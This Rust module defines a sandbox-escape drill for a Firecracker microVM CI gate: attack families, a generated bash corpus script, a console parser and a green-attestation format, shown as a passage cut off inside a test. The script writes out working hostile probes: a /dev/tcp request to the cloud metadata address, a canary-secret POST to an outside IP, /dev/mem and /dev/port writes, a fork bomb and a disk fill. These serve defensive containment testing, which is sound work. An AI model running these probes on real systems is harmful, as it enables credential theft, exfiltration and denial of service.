//! # The escape-drill adversarial corpus + the green-attestation artifact (CI-P5 → P-239, M2)
//!
//! **Owning architecture (byte-authoritative):**
//! `planning/04-subsystem-architectures/continuous-integration/architecture/02-internals-and-algorithms.md`
//! §5.5 ("The escape drill (D-4 / T-5) — CI's single hard go/no-go") — the adversarial corpus
//! enumerated + the green-attestation artifact. **Drills:**
//! `planning/05-refined-shared-systems-architecture/testing-strategy/01-whole-system-e2e-and-drill-catalogue.md`
//! row **AG-D4 / CI-T1** (compute tool attempts a kernel escape on a REAL kernel → **ZERO escapes**;
//! green escape attestation or CI is no-go) + §3.5 (the one hard gate — the adversarial corpus
//! families) + §2.5 (the survival-signal assertions). **Reconciliation:**
//! `00-reconciliation-decisions.md` X-6 (the escape drill gates ALL agent execution, not only CI).
//! **Contract:** `contract-index.md` row 8.4 (the real-kernel escape drill gates both kinds).
//!
//! ## What this module IS — the corpus AS DATA + the attestation format (no boot here)
//! This module carries the corpus **definition** (the seven adversarial families enumerated as
//! [`AttackFamily`] + the per-attack [`AttackMarker`] catalogue), the **in-guest script generation**
//! ([`build_corpus_script`] — the bash payload run as PID1 inside the hardened microVM), the
//! **host-side marker parser** ([`parse_console`] → [`DrillReport`]), and the **green-attestation
//! artifact format** ([`EscapeAttestation`] — the dated, structured record AG-P17 (P-229) consumes).
//!
//! It is **VM-free and DB-free**: this module never boots a guest. The REAL drill — boot a
//! Firecracker microVM, run the corpus, observe containment, emit the attestation — lives ONLY in
//! the `integration`-feature test (`tests/escape_drill_test.rs`), gated to SKIP gracefully without
//! `/dev/kvm` / `firecracker`. So `cargo build --workspace` + the default `cargo test` stay green
//! without a kernel, while the HARD GATE runs the full corpus on real silicon.
//!
//! ## The PROVE-IT discipline (EI-04 §5.1; EI-01 §3)
//! A property not drilled on a REAL kernel is a claim, not a fact. The corpus FORCES each attack and
//! the system is OBSERVED to contain it: each attack prints `CONTAINED` **only if it genuinely failed
//! to escape**, `ESCAPED` if it breached. The host-side drill counts escapes; **ANY escape — or any
//! attack that did NOT run (a missing marker) — makes the gate RED**. There is NO hardcoded
//! "0 escapes": [`DrillReport::is_green`] is computed from the parsed console, and the attestation is
//! emitted ONLY when the real run is green. A red AG-D4 is a dated no-go (a scorecard row), NEVER a
//! weakened threshold.
//!
//! ## The mandatory hardening profile is ENFORCED on the kernel-primitive family
//! The kernel-exploit primitives (load a module / `/dev/mem` / I/O ports / privileged mount) are run
//! under the mandatory hardening posture (arch 02 §5.3): **all Linux caps dropped + no-new-privs**
//! (via `setpriv` in-guest), so a privileged op is DENIED (EPERM) exactly as it is for a hardened
//! sandbox payload — and the KVM boundary contains the rest. The fork bomb is contained by a
//! **cgroup v2 `pids.max`** ceiling (the [`HardeningProfile::pids_max`](crate::hardening::HardeningProfile)
//! value), and the ceiling is asserted to have HELD (the kernel refused excess forks; the guest
//! stayed up). Egress attacks (metadata SSRF / control-plane / cross-tenant / secret exfil) fail
//! because the fully default-deny profile attaches **no NIC at all** (egress closed at the device
//! level). Disk fill hits ENOSPC on the quota'd tmpfs scratch; root stays read-only.
//!
//! ## MUTATION-SCORE FLOOR (mandatory-core, security-load-bearing)
//! The corpus + attestation modules are **mandatory-core and the single most security-load-bearing
//! code in the build** (they decide the AG-D4 / CI-T1 go/no-go for ALL untrusted execution). Their
//! cargo-mutants mutation-score floor is **100% — zero surviving mutants** (the same floor the
//! runner's exactly-once idempotency carries). The load-bearing predicates each have a mutant-killing
//! unit test: [`DrillReport::is_green`] (a flipped `==`/`&&`/`||` or a dropped clause is killed by
//! `a_single_escape_makes_the_gate_red`, `a_missing_marker_makes_the_gate_red_not_green`,
//! `a_truncated_console_without_the_end_marker_is_red`); [`parse_console`]'s exact-token match (a
//! relaxed `==`→`contains` is killed by `substring_ids_do_not_false_match` + the DidNotRun default);
//! and [`EscapeAttestation::from_green_drill`]'s refuse-over-red guard (a deleted/negated check is
//! killed by `attestation_is_refused_over_a_red_drill`). The corpus↔catalogue lockstep
//! (`the_corpus_catalogue_and_the_generated_script_stay_in_lockstep`) kills a mutant that drops an
//! attack from the generated script.
//!
//! ## FLOOR (named per CI-P5) — there is NO floor on ZERO-escapes
//! ZERO escapes is BOTH the floor and the full answer, and a **PERMANENT GATE** re-run on every
//! backend/image/kernel change (untrusted-code execution is a never-"done" surface, EI-04 §5). The
//! gVisor second backend re-runs THIS SAME drill (**CI-P28**); the M4-boundary re-confirm is
//! **CI-P27 / P-348**; continuous fuzzing + the full CVE corpus + a pre-GA third-party pentest remain
//! ongoing residuals. This drill PROVES the hard gate on **Firecracker (the production default)**;
//! gVisor (`runsc`) is a NAMED parametrized residual (run-when-available — see [`Backend`]).

use serde::{Deserialize, Serialize};

/// The corpus version stamped into every attestation (arch 02 §5.5: the corpus version is part of
/// the green artifact, so a re-run after a corpus change is a NEW attestation). Bump on any change
/// to the attack set / [`build_corpus_script`].
pub const CORPUS_VERSION: u32 = 1;

/// The marker grep prefix the host-side parser keys on. Each attack prints `<id> CONTAINED` or
/// `<id> ESCAPED`; the corpus brackets its output with [`BEGIN_MARKER`] / [`END_MARKER`] so a
/// truncated console (the guest died mid-corpus) is detectable (a missing END ⇒ not all attacks ran
/// ⇒ RED).
pub const BEGIN_MARKER: &str = "CORPUS_BEGIN";
/// The end-of-corpus marker (see [`BEGIN_MARKER`]).
pub const END_MARKER: &str = "CORPUS_END";

/// The seven adversarial families enumerated by arch 02 §5.5 / drill-catalogue §3.5. Each family
/// owns one or more concrete [`AttackMarker`]s; the attestation reports a per-family CONTAINED count.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum AttackFamily {
    /// Kernel-exploit primitives: load a module, raw I/O-port (ioperm/iopl), write `/dev/mem`,
    /// privileged mount — each must be DENIED (EPERM) under the hardened profile; the KVM boundary
    /// contains the rest.
    KernelExploit,
    /// Cloud-metadata SSRF → cred theft (`169.254.169.254`) — must fail (no route / no NIC).
    CloudMetadataSsrf,
    /// Control-plane / internal-RPC reach (a private/control-plane address) — must fail (no route).
    ControlPlaneReach,
    /// Cross-tenant network/storage (another tenant's host) — must fail (no route).
    CrossTenant,
    /// Secret exfil via egress — must be blocked by egress default-deny.
    SecretExfil,
    /// Fork bomb past the pids ceiling — must be contained (cgroup `pids.max` held; guest stayed up).
    ForkBomb,
    /// Disk fill past the scratch quota — must hit ENOSPC; root stays read-only.
    DiskFill,
}

impl AttackFamily {
    /// The stable string key used in the attestation's per-family count map.
    pub fn key(self) -> &'static str {
        match self {
            AttackFamily::KernelExploit => "kernel_exploit",
            AttackFamily::CloudMetadataSsrf => "cloud_metadata_ssrf",
            AttackFamily::ControlPlaneReach => "control_plane_reach",
            AttackFamily::CrossTenant => "cross_tenant",
            AttackFamily::SecretExfil => "secret_exfil",
            AttackFamily::ForkBomb => "fork_bomb",
            AttackFamily::DiskFill => "disk_fill",
        }
    }

    /// All seven families, in corpus order.
    pub fn all() -> &'static [AttackFamily] {
        &[
            AttackFamily::KernelExploit,
            AttackFamily::CloudMetadataSsrf,
            AttackFamily::ControlPlaneReach,
            AttackFamily::CrossTenant,
            AttackFamily::SecretExfil,
            AttackFamily::ForkBomb,
            AttackFamily::DiskFill,
        ]
    }
}

/// One concrete attack in the corpus: its console marker id + the family it belongs to. The id is
/// what the in-guest script prints (`<id> CONTAINED|ESCAPED`) and what [`parse_console`] looks for.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct AttackMarker {
    /// The marker id the in-guest script prints (e.g. `K1_module`).
    pub id: &'static str,
    /// The family this attack belongs to.
    pub family: AttackFamily,
}

/// The full enumerated catalogue of concrete attacks (one row per marker the corpus prints). The
/// host-side drill REQUIRES every one of these to have printed a `CONTAINED` (and zero `ESCAPED`) —
/// a marker absent from the console means "the attack did not run" ⇒ RED. This catalogue and
/// [`build_corpus_script`] MUST stay in lockstep (a unit test asserts every catalogued id appears in
/// the generated script).
pub const CORPUS: &[AttackMarker] = &[
    AttackMarker {
        id: "K1_module",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "K2_devmem",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "K3_ioport",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "K4_mount",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "M1_metadata_ssrf",
        family: AttackFamily::CloudMetadataSsrf,
    },
    AttackMarker {
        id: "C1_controlplane",
        family: AttackFamily::ControlPlaneReach,
    },
    AttackMarker {
        id: "T1_crosstenant",
        family: AttackFamily::CrossTenant,
    },
    AttackMarker {
        id: "E1_secret_exfil",
        family: AttackFamily::SecretExfil,
    },
    AttackMarker {
        id: "F1_forkbomb",
        family: AttackFamily::ForkBomb,
    },
    AttackMarker {
        id: "D1_root_readonly",
        family: AttackFamily::DiskFill,
    },
    AttackMarker {
        id: "D2_diskfill",
        family: AttackFamily::DiskFill,
    },
];

/// Build the in-guest bash corpus script (run as PID1 in the hardened microVM via
/// `init=/bin/bash /dev/vdb`). `pids_max` is the cgroup `pids.max` fork-bomb ceiling
/// (the [`HardeningProfile::pids_max`](crate::hardening::HardeningProfile) value).
///
/// The script is staged on a virtio drive (`/dev/vdb`) by the drill harness, then **padded to a
/// block boundary** (a Firecracker drive smaller than 512 bytes presents as 0 blocks — the host
/// harness handles the padding). Each attack prints `<id> CONTAINED` iff it genuinely failed to
/// breach the boundary, `<id> ESCAPED` if it breached. The kernel-primitive family runs UNDER the
/// mandatory hardening posture (all-caps-dropped + no-new-privs via `setpriv`); the fork bomb is
/// capped by a cgroup-v2 `pids.max` and the ceiling is asserted to have HELD.
pub fn build_corpus_script(pids_max: u32) -> String {
    // `pids_max` is a u32 formatted as a decimal literal — no shell-injection surface.
    format!(
        r#"# AG-D4 / CI-T1 adversarial escape corpus (corpus_version={cv})
# PID1 bash, hardened Firecracker microVM, REAL KVM kernel. Markers parsed by the host drill:
#   "<id> CONTAINED" iff the attack genuinely failed to breach the boundary; "<id> ESCAPED" if it did.
mount -t proc proc /proc 2>/dev/null
mount -t sysfs sys /sys 2>/dev/null
mount -t tmpfs -o size=8m tmpfs /run 2>/dev/null
mount -t cgroup2 cg2 /sys/fs/cgroup 2>/dev/null
echo "{begin} corpus_version={cv} kernel=$(uname -r 2>/dev/null) guest_euid=$EUID"

# ---- family: kernel-exploit primitives, run UNDER the mandatory hardening profile
#      (all-caps-dropped + no-new-privs); each privileged op must be DENIED/EPERM ----
cat > /run/k.sh <<'ATK_EOF'
if modprobe dummy 2>/dev/null || insmod /x.ko 2>/dev/null; then echo "K1_module ESCAPED"; else echo "K1_module CONTAINED"; fi
if dd if=/dev/zero of=/dev/mem bs=1 count=1 seek=1048576 2>/dev/null; then echo "K2_devmem ESCAPED"; else echo "K2_devmem CONTAINED"; fi
if dd if=/dev/zero of=/dev/port bs=1 count=1 2>/dev/null; then echo "K3_ioport ESCAPED"; else echo "K3_ioport CONTAINED"; fi
if mount -t tmpfs none /proc/sys 2>/dev/null; then echo "K4_mount ESCAPED"; else echo "K4_mount CONTAINED"; fi
ATK_EOF
setpriv --no-new-privs --bounding-set -all --inh-caps -all --ambient-caps -all /bin/bash /run/k.sh 2>/dev/null

# ---- cloud-metadata SSRF (169.254.169.254) — no NIC => no route ----
if timeout 3 bash -c 'exec 3<>/dev/tcp/169.254.169.254/80; printf "GET /latest/meta-data/ HTTP/1.0\r\n\r\n">&3' 2>/dev/null; then echo "M1_metadata_ssrf ESCAPED"; else echo "M1_metadata_ssrf CONTAINED"; fi

# ---- control-plane / internal-RPC reach — no route ----
if timeout 3 bash -c 'exec 3<>/dev/tcp/10.0.0.1/8080' 2>/dev/null; then echo "C1_controlplane ESCAPED"; else echo "C1_controlplane CONTAINED"; fi

# ---- cross-tenant network — no route ----
if timeout 3 bash -c 'exec 3<>/dev/tcp/192.168.13.37/443' 2>/dev/null; then echo "T1_crosstenant ESCAPED"; else echo "T1_crosstenant CONTAINED"; fi

# ---- secret exfil via egress (default-deny must block) ----
SECRET="myelin-drill-canary-$$"
if timeout 3 bash -c "exec 3<>/dev/tcp/93.184.216.34/80; printf 'POST %s' '$SECRET'>&3" 2>/dev/null; then echo "E1_secret_exfil ESCAPED"; else echo "E1_secret_exfil CONTAINED"; fi

# ---- fork bomb — cgroup pids.max ceiling must HOLD; guest stays up ----
mkdir -p /sys/fs/cgroup/drill 2>/dev/null
echo "+pids" > /sys/fs/cgroup/cgroup.subtree_control 2>/dev/null
echo {pids_max} > /sys/fs/cgroup/drill/pids.max 2>/dev/null
PMAX=$(cat /sys/fs/cgroup/drill/pids.max 2>/dev/null)
( echo $BASHPID > /sys/fs/cgroup/drill/cgroup.procs 2>/dev/null; while : ; do /bin/sleep 60 & done ) 2>/dev/null &
BOMB=$!
n=0; while [ $n -lt 25 ]; do n=$((n+1)); sleep 0.1 2>/dev/null; done
PEAK=$(cat /sys/fs/cgroup/drill/pids.current 2>/dev/null)
REFUSED=$(awk '/^max/{{print $2}}' /sys/fs/cgroup/drill/pids.events 2>/dev/null)
kill $BOMB 2>/dev/null
if [ "${{PEAK:-9999}}" -le "${{PMAX:-0}}" ] && [ "${{REFUSED:-0}}" -gt 0 ]; then echo "F1_forkbomb CONTAINED peak=$PEAK ceiling=$PMAX refused=$REFUSED"; else echo "F1_forkbomb ESCAPED peak=$PEAK ceiling=$PMAX"; fi

# ---- disk fill + read-only root ----
if echo x 2>/dev/null > /root_write_probe; then echo "D1_root_readonly ESCAPED"; rm -f /root_write_probe 2>/dev/null; else echo "D1_root_readonly CONTAINED"; fi
mount -t tmpfs -o size=4m tmpfs /run/scratch 2>/dev/null || mkdir -p /run/scratch
dd if=/dev/zero of=/run/scratch/fill bs=1M count=64 2>/dev/null; rc=$?
if [ $rc -ne 0 ]; then echo "D2_diskfill CONTAINED enospc_rc=$rc"; else echo "D2_diskfill ESCAPED"; fi

echo "{end}"
sync
reboot -f
"#,
        cv = CORPUS_VERSION,
        begin = BEGIN_MARKER,
        end = END_MARKER,
        pids_max = pids_max,
    )
}

/// The outcome of one catalogued attack as observed on the guest console.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum AttackOutcome {
    /// The attack genuinely failed to breach the boundary (the GOOD outcome).
    Contained,
    /// The attack breached the boundary (CATASTROPHIC — any one ⇒ the gate is RED).
    Escaped,
    /// No marker for this attack appeared on the console — the attack did NOT run (e.g. the guest
    /// died mid-corpus). Treated as a RED condition (a property not drilled is not proven).
    DidNotRun,
}

/// The host-side parse of a real guest console into per-attack outcomes (the OBSERVATION half of the
/// drill). Built ONLY from the captured console — never hardcoded.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DrillReport {
    /// Per catalogued attack, in [`CORPUS`] order: `(marker_id, family, outcome)`.
    pub outcomes: Vec<(&'static str, AttackFamily, AttackOutcome)>,
    /// Whether the corpus printed its END marker (every attack ran to completion). A truncated
    /// console (guest died mid-corpus) has `corpus_completed == false` ⇒ RED.
    pub corpus_completed: bool,
}

impl DrillReport {
    /// The total number of escapes observed across the corpus. The GATE passes iff this is 0 AND
    /// every attack ran (no [`AttackOutcome::DidNotRun`]) AND the corpus completed.
    pub fn escapes(&self) -> usize {
        self.outcomes
            .iter()
            .filter(|(_, _, o)| *o == AttackOutcome::Escaped)
            .count()
    }

    /// The number of attacks that did not run (a missing marker). Any > 0 ⇒ RED (a property not
    /// drilled is not proven).
    pub fn did_not_run(&self) -> usize {
        self.outcomes
            .iter()
            .filter(|(_, _, o)| *o == AttackOutcome::DidNotRun)
            .count()
    }

    /// The per-family CONTAINED count (for the attestation). Only [`AttackOutcome::Contained`]
    /// outcomes are counted.
    pub fn contained_by_family(&self, family: AttackFamily) -> u32 {
        self.outcomes
            .iter()
            .filter(|(_, f, o)| *f == family && *o == AttackOutcome::Contained)
            .count() as u32
    }

    /// **The GATE predicate.** Green iff the corpus completed, every catalogued attack ran, and
    /// ZERO escapes were observed. This is computed from the parsed console — there is no hardcoded
    /// "0 escapes". A red result is a dated no-go, never a weakened threshold.
    pub fn is_green(&self) -> bool {
        self.corpus_completed && self.escapes() == 0 && self.did_not_run() == 0
    }

    /// A human-readable per-attack summary line (for the test's `--nocapture` proof + the no-go
    /// scorecard row on a red).
    pub fn summary(&self) -> String {
        let mut s = format!(
            "AG-D4 drill: {} attacks | escapes={} did_not_run={} corpus_completed={}\n",
            self.outcomes.len(),
            self.escapes(),
            self.did_not_run(),
            self.corpus_completed
        );
        for (id, fam, outcome) in &self.outcomes {
            s.push_str(&format!("  {id:<20} [{:<20}] {outcome:?}\n", fam.key()));
        }
        s
    }
}

/// Parse a captured guest serial console into a [`DrillReport`] (the OBSERVATION half of the drill).
/// For each catalogued attack, the parser looks for `"<id> CONTAINED"` or `"<id> ESCAPED"` on a
/// line; if neither appears, the attack [`DidNotRun`](AttackOutcome::DidNotRun). The corpus-completed
/// flag is set iff the [`END_MARKER`] appears (every attack ran to completion).
///
/// The parser is deliberately strict: an `ESCAPED` marker for ANY attack (or a missing marker)
/// drives the gate RED. It never infers `CONTAINED` from the absence of `ESCAPED`.
pub fn parse_console(console: &str) -> DrillReport {
    let corpus_completed = console.contains(END_MARKER);
    let outcomes = CORPUS
        .iter()
        .map(|atk| {
            // Look for an explicit marker line for this attack id. Match `<id> CONTAINED` /
            // `<id> ESCAPED` as whitespace-delimited tokens so a substring id can't false-match.
            let mut outcome = AttackOutcome::DidNotRun;
            for line in console.lines() {
                let mut toks = line.split_whitespace();
                let Some(first) = toks.next() else { continue };
                if first != atk.id {
                    continue;
                }
                match toks.next() {
                    Some("CONTAINED") => {
                        outcome = AttackOutcome::Contained;
                        break;
                    }
                    Some("ESCAPED") => {
                        outcome = AttackOutcome::Escaped;
                        break;
                    }
                    _ => {}
                }
            }
            (atk.id, atk.family, outcome)
        })
        .collect();
    DrillReport {
        outcomes,
        corpus_completed,
    }
}

/// Which isolation backend was exercised by a drill run. Firecracker is the production default and
/// the GATE; gVisor (`runsc`) is the named parametrized residual (run-when-available, CI-P28).
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum Backend {
    /// The Firecracker microVM (KVM + minimal VMM) — the production default; the AG-D4 GATE is
    /// PROVEN on this backend.
    FirecrackerMicrovm,
    /// gVisor (`runsc`) — the named second backend (CI-P28); a parametrized residual on hosts that
    /// lack the privileges `runsc` needs.
    GvisorRunsc,
}

impl Backend {
    /// The stable string key used in the attestation.
    pub fn key(self) -> &'static str {
        match self {
            Backend::FirecrackerMicrovm => "firecracker(microVM/KVM)",
            Backend::GvisorRunsc => "gvisor(runsc)",
        }
    }
}

/// Whether a parametrized backend was actually exercised in this drill, or recorded as a
/// run-when-available residual (e.g. gVisor on a host without the privileges `runsc` needs — do NOT
/// fake it). Carried in the attestation so a consumer (AG-P17 / P-229) sees exactly which backends
/// were genuinely drilled vs deferred.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct BackendRun {
    /// The backend.
    pub backend: Backend,
    /// True iff the corpus was ACTUALLY run on this backend on real silicon in this drill.
    pub exercised: bool,
    /// When not exercised, the reason (e.g. "runsc requires privileges this host lacks (no sudo)").
    pub residual_note: Option<String>,
}

/// The **green-attestation artifact** (arch 02 §5.5) — the dated, structured record a green AG-D4 /
/// CI-T1 drill emits, and **exactly what AG-P17 (P-229) consumes** as the gate that must be green on
/// the production backend before any untrusted execution in M3+. It is emitted ONLY when the real
/// run is green ([`DrillReport::is_green`]); a red drill emits NO attestation (it is a dated no-go).
///
/// Fields: backend(s) exercised, the rootfs + kernel image sha256 digests, the kernel version, the
/// corpus version, the per-family CONTAINED counts, `total_escapes` (MUST be 0), and a timestamp.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct EscapeAttestation {
    /// The artifact kind tag (so a consumer can dispatch on it).
    pub artifact: String,
    /// The drill id (`AG-D4 / CI-T1`).
    pub drill: String,
    /// ISO-8601 date the drill ran (the run date stamps this; a real CI run stamps the wall clock).
    pub date: String,
    /// The backends drilled in this run — which were ACTUALLY exercised vs named residual.
    pub backends: Vec<BackendRun>,
    /// The production-default backend on which the GATE is proven (Firecracker).
    pub gate_backend: Backend,
    /// The sha256 of the guest rootfs image (the "image digest" — re-run on every image change).
    pub rootfs_sha256: String,
    /// The sha256 of the guest kernel image (re-run on every kernel change).
    pub kernel_sha256: String,
    /// The guest kernel version (`uname -r`, e.g. `6.1.168`).
    pub kernel_version: String,
    /// The corpus version (re-run on every corpus change).
    pub corpus_version: u32,
    /// Per-family CONTAINED counts (family key → count). Every catalogued attack is CONTAINED.
    pub contained_by_family: Vec<(String, u32)>,
    /// The total escapes observed — **MUST be 0** for a green attestation (the gate predicate).
    pub total_escapes: u32,
    /// The total attacks run (every catalogued attack ran — no DidNotRun).
    pub total_attacks: u32,
    /// The named residuals (the permanent-gate / gVisor-CI-P28 / M4-re-confirm-CI-P27 / fuzzing+CVE+
    /// pentest notes), carried in the artifact so the consumer sees the no-floor posture in writing.
    pub residuals: Vec<String>,
}

impl EscapeAttestation {
    /// The named residuals for the AG-D4 / CI-T1 gate (CI-P5), stated in writing (arch 02 §5.5;
    /// drill-catalogue §3.5 + §4 PERMANENT GATE; AG-P17 floor):
    pub fn residuals() -> Vec<String> {
        vec![
            "ZERO-escapes is BOTH the floor and the full answer — there is NO mutation-score / \
             threshold floor below it; it is a PERMANENT GATE re-run on every backend/image/kernel \
             change forever (untrusted-code execution is a never-\"done\" surface, EI-04 §5)."
                .to_string(),
            "gVisor (runsc) re-runs THIS SAME drill as the named second backend — CI-P28."
                .to_string(),
            "The M4-boundary re-confirm on the prod CI image is CI-P27 / P-348 (agent-side AG-P21)."
                .to_string(),
            "Continuous fuzzing + the full CVE corpus + a pre-GA third-party pentest remain ongoing \
             residuals on top of this gate (never \"done\")."
                .to_string(),
        ]
    }

    /// Build a green attestation from a real, green drill report. Returns `Err` if the report is NOT
    /// green — an attestation is NEVER minted over a red drill (a red AG-D4 is a dated no-go, never a
    /// weakened threshold). This is the structural guard that a green attestation can only describe a
    /// genuinely-green run.
    #[allow(clippy::too_many_arguments)]
    pub fn from_green_drill(
        date: impl Into<String>,
        report: &DrillReport,
        backends: Vec<BackendRun>,
        gate_backend: Backend,
        rootfs_sha256: impl Into<String>,
        kernel_sha256: impl Into<String>,
        kernel_version: impl Into<String>,
    ) -> Result<EscapeAttestation, String> {
        if !report.is_green() {
            return Err(format!(
                "REFUSING to mint a green attestation over a non-green drill \
                 (escapes={}, did_not_run={}, corpus_completed={}). A red AG-D4 is a dated no-go, \
                 never a weakened threshold.",
                report.escapes(),
                report.did_not_run(),
                report.corpus_completed
            ));
        }
        let contained_by_family = AttackFamily::all()
            .iter()
            .map(|f| (f.key().to_string(), report.contained_by_family(*f)))
            .collect();
        Ok(EscapeAttestation {
            artifact: "ag-d4-green-escape-attestation".to_string(),
            drill: "AG-D4 / CI-T1".to_string(),
            date: date.into(),
            backends,
            gate_backend,
            rootfs_sha256: rootfs_sha256.into(),
            kernel_sha256: kernel_sha256.into(),
            kernel_version: kernel_version.into(),
            corpus_version: CORPUS_VERSION,
            contained_by_family,
            total_escapes: 0,
            total_attacks: report.outcomes.len() as u32,
            residuals: EscapeAttestation::residuals(),
        })
    }

    /// The one-line `[AG-D4 GREEN] …` stdout line (the telemetry green artifact line — EI-01 §3:
    /// observability is part of the pass).
    pub fn green_line(&self) -> String {
        let exercised: Vec<&str> = self
            .backends
            .iter()
            .filter(|b| b.exercised)
            .map(|b| b.backend.key())
            .collect();
        format!(
            "[AG-D4 GREEN] {date} drill={drill} gate-backend={gate} exercised={exercised:?} \
             kernel={kver} rootfs-sha256={rootfs:.16}… corpus-version={cv} \
             total-attacks={ta} total-escapes={te}",
            date = self.date,
            drill = self.drill,
            gate = self.gate_backend.key(),
            exercised = exercised,
            kver = self.kernel_version,
            rootfs = self.rootfs_sha256,
            cv = self.corpus_version,
            ta = self.total_attacks,
            te = self.total_escapes,
        )
    }

    /// Serialize to the JSON artifact form AG-P17 (P-229) consumes.
    pub fn to_json(&self) -> String {
        serde_json::to_string_pretty(self).expect("EscapeAttestation is always serializable")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A console where every catalogued attack reports CONTAINED and the corpus completed.
    fn green_console() -> String {
        let mut s = format!("{BEGIN_MARKER} corpus_version=1 kernel=6.1.168 guest_euid=0\n");
        for atk in CORPUS {
            s.push_str(&format!("{} CONTAINED extra=stuff\n", atk.id));
        }
        s.push_str(&format!("{END_MARKER}\n"));
        s
    }

    #[test]
    fn the_corpus_catalogue_and_the_generated_script_stay_in_lockstep() {
        // Every catalogued attack id MUST appear in the generated in-guest script (so a real run
        // actually attempts it). A drift here would let an attack silently not run.
        let script = build_corpus_script(64);
        for atk in CORPUS {
            assert!(
                script.contains(atk.id),
                "catalogued attack `{}` is missing from the generated corpus script",
                atk.id
            );
        }
        // The script brackets its output with the begin/end markers + sets pids.max from the arg.
        assert!(script.contains(BEGIN_MARKER));
        assert!(script.contains(END_MARKER));
        assert!(script.contains("/sys/fs/cgroup/drill/pids.max"));
        assert!(script.contains("> /sys/fs/cgroup/drill/pids.max"));
        assert!(script.contains("echo 64 >") || script.contains("echo 64>"));
        // The hardening posture is enforced on the kernel-primitive family.
        assert!(script.contains("setpriv --no-new-privs"));
    }

    #[test]
    fn all_seven_families_are_represented_in_the_corpus() {
        for fam in AttackFamily::all() {
            assert!(
                CORPUS.iter().any(|a| a.family == *fam),
                "family {:?} has no catalogued attack",
                fam
            );
        }
    }

    #[test]
    fn parse_console_reports_green_on_an_all_contained_console() {
        let report = parse_console(&green_console());
        assert_eq!(report.escapes(), 0);
        assert_eq!(report.did_not_run(), 0);
        assert!(report.corpus_completed);
        assert!(report.is_green());
        // Per-family CONTAINED counts add up to the catalogue size.
        let total: u32 = AttackFamily::all()
            .iter()
            .map(|f| report.contained_by_family(*f))
            .sum();
        assert_eq!(total as usize, CORPUS.len());
    }

    #[test]
    fn a_single_escape_makes_the_gate_red() {
        // Flip ONE attack to ESCAPED — the whole gate goes red (one escape is catastrophic).
        let mut console = green_console();
        console = console.replace("K2_devmem CONTAINED", "K2_devmem ESCAPED");
        let report = parse_console(&console);
        assert_eq!(report.escapes(), 1);
        assert!(!report.is_green(), "ANY escape ⇒ RED");
    }

    #[test]
    fn a_missing_marker_makes_the_gate_red_not_green() {
        // Remove one attack's line entirely (the attack did NOT run). The parser must NOT infer
        // CONTAINED from the absence of ESCAPED — it reports DidNotRun ⇒ RED.
        let console = green_console().replace("M1_metadata_ssrf CONTAINED extra=stuff\n", "");
        let report = parse_console(&console);
        assert_eq!(report.did_not_run(), 1);
        assert_eq!(report.escapes(), 0);
        assert!(
            !report.is_green(),
            "a property not drilled is not proven ⇒ RED"
        );
    }

    #[test]
    fn a_truncated_console_without_the_end_marker_is_red() {
        // The guest died mid-corpus (no END marker) — even if every printed line is CONTAINED.
        let mut console = green_console();
        console = console.replace(&format!("{END_MARKER}\n"), "");
        let report = parse_console(&console);
        assert!(!report.corpus_completed);
        assert!(
            !report.is_green(),
            "no END marker ⇒ corpus did not complete ⇒ RED"
        );
    }

    #[test]
    fn family_keys_are_distinct_and_stable() {
        // The per-family attestation count map keys on these; they must be non-empty + distinct
        // (a mutant returning "" or a duplicate would collapse the count map).
        let keys: Vec<&str> = AttackFamily::all().iter().map(|f| f.key()).collect();
        assert!(
            keys.iter().all(|k| !k.is_empty()),
            "every family key is non-empty"
        );
        let mut sorted = keys.clone();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(sorted.len(), keys.len(), "family keys must be distinct");
        assert_eq!(AttackFamily::KernelExploit.key(), "kernel_exploit");
        assert_eq!(AttackFamily::ForkBomb.key(), "fork_bomb");
    }

    #[test]
    fn summary_names_every_attack_and_the_verdict_counts() {
        // The summary is the no-go scorecard row on a red + the --nocapture proof; it must name every
        // catalogued attack id and carry the escape/did_not_run counts (a mutant returning "" fails).
        let report = parse_console(&green_console());
        let s = report.summary();
        assert!(s.contains("escapes=0"));
        assert!(s.contains("did_not_run=0"));
        assert!(s.contains("corpus_completed=true"));
        for atk in CORPUS {
            assert!(s.contains(atk.id), "summary must name attack `{}`", atk.id);
        }
    }

    #[test]
    fn substring_ids_do_not_false_match() {
        // `D1_root_readonly` must not be matched by a line that merely contains it as a substring of
        // a longer token, nor must `D2` match `D1`. The parser splits on whitespace and compares the
        // FIRST token exactly.
        let mut console = green_console();
        // Inject a noise line that contains an id as a substring of a longer first token.
        console.push_str("XK2_devmem CONTAINED\n");
        console.push_str("note: K2_devmem was attempted\n"); // first token `note:` ≠ id
        let report = parse_console(&console);
        // K2 still resolves from its real `K2_devmem CONTAINED` line (green console), unaffected.
        let (_, _, k2) = report
            .outcomes
            .iter()
            .find(|(id, _, _)| *id == "K2_devmem")
            .unwrap();
        assert_eq!(*k2, AttackOutcome::Contained);
    }

    #[test]
    fn attestation_is_refused_over_a_red_drill() {
        // The structural guard: a green attestation can NEVER be minted over a red drill.
        let mut console = green_console();
        console = console.replace("K1_module CONTAINED", "K1_module ESCAPED");
        let red = parse_console(&console);
        let r = EscapeAttestation::from_green_drill(
            "2026-06-21",
            &red,
            vec![BackendRun {
                backend: Backend::FirecrackerMicrovm,
                exercised: true,
                residual_note: None,
            }],
            Backend::FirecrackerMicrovm,
            "rootfs-sha",
            "kernel-sha",
            "6.1.168",
        );
        assert!(r.is_err(), "an attestation must NEVER describe a red drill");
    }

    #[test]
    fn attestation_over_a_green_drill_has_zero_escapes_and_the_named_residuals() {
        let report = parse_console(&green_console());
        let att = EscapeAttestation::from_green_drill(
            "2026-06-21",
            &report,
            vec![
                BackendRun {
                    backend: Backend::FirecrackerMicrovm,
                    exercised: true,
